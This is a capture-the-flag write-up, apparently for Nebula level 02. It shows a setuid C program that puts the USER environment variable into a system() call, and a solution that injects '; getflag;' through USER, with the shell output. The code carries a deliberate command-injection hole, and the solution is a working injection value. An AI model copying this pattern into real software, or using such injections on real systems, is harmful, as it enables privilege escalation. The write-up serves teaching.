## Challenge
There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?

## Solution
```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  char *buffer;

  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  buffer = NULL;

  asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
  printf("about to call system(\"%s\")\n", buffer);
  
  system(buffer);
}
```
The program executes `buffer`.
```c
system(buffer);
```
Buffer is comprised in the following line:
```c
asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
```
We can change the envar `USER` to craft a `command-injection` attack.
```shell
level02@nebula:/home/flag02$ env USER="we r 1337; getflag; echo this" ./flag02
about to call system("/bin/echo we r 1337; getflag; echo this is cool")
we r 1337
You have successfully executed getflag on a target account
this is cool
```
